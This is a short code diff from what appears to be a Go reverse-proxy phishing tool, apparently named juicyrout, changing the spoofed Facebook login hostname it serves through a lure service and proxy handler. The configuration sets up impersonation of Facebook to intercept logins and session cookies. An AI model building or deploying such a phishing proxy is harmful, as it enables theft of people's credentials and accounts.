@@ -48,7 +48,7 @@ func main() {
 		CookieName:     "session_id",
 		Store:          store,
 		InvalidAuthURL: "https://duckduckgo.com",
-		LoginURL:       fmt.Sprintf("https://facebook-com.host.juicyrout:%s/", port),
+		LoginURL:       fmt.Sprintf("https://www-facebook-com.host.juicyrout:%s/", port),
 		LureService:    NewStaticLureService([]string{"/abc/def"}),
 	}))
 	app.All("/*", NewProxyHandler(client, req, resp))
